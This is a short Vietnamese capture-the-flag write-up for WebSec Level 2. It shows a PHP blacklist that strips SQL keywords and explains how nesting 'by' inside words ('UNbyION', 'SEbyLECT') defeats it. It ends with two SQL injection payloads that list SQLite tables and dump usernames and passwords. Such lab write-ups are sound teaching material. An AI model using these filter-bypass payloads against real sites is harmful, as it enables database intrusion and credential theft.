Về cơ bản, luồng hoạt động của Level2 sẽ gần như tương tự với Level1. Do đó tôi sẽ không viết lại nữa, các bạn có thể tham khảo [Level1](https://github.com/ncKien05/Websec-Writeups/blob/main/Level01.md) để hiểu rõ cách hoạt động.

Tôi sẽ nói đến điểm nâng cấp của Level2 so với Level1 ở bên dưới:

* Level2 bổ sung thêm 1 đoạn code để chặn các từ khóa tìm kiếm:  
```PHP
$searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
$injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
```

* Nó sử dụng black list để biến đổi các từ khóa (`union|order|select|from|group|by`) thành khoảng trắng. Hay có thể hiểu đơn giản là nếu trong từ tồn tại bất kỳ từ khó nào liên quan thì đều bị xóa đi. Ví dụ nếu bạn nhập `1 union select 1,2,3` thì khi qua hàm này nó sẽ trở thành `1           2,3`. 
* Việc filter bằng black_list như này thực sự ngớ ngẩn, kẻ tấn công sẽ cố tìm mọi cách để filter những cái mà danh sách này chặn. Ví dụ ở bài trên, nếu tôi nhập vào `SELbyECT`, khi web nhận thấy từ khóa `by` nó sẽ lập tưc xóa từ này đi. Khi đó câu lệnh trở thành `SELECT` và bùm.  

# Payload expploit
`2 UNbyION SEbyLECT name,sql FRbyOM sqlite_master WHERE type='table'--`  

`2 UNbyION SEbyLECT username,password FRbyOM users--`